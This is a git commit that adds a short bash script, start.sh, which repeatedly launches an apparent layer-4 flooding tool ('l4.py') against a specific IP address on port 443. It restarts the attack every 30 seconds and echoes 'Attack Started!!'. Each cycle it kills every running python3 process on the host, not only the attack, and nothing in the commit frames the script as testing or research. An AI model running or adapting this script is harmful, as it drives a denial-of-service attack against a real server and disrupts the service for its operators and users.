efdda187e03cf6fd2b3958d215318aca9be4f88d
KLVSPL <101648648+KLVSPL@users.noreply.github.com>
2022-05-09 06:34:54 +0800

    Create start.sh

---
+++ start.sh
@@ -0,0 +1,13 @@
+#!/bin/bash
+procname="python3"
+atk_cmd="python3 l4.py -i 35.221.231.4 -p 443"
+while true
+do
+    $atk_cmd >/dev/null &
+    echo Attack Started!!
+    sleep 30
+    echo Attack killed!!
+    kill $(ps aux | grep $procname | grep -v grep | awk '{print $2}')
+    $atk_cmd >/dev/null &
+    sleep 0.01
+done
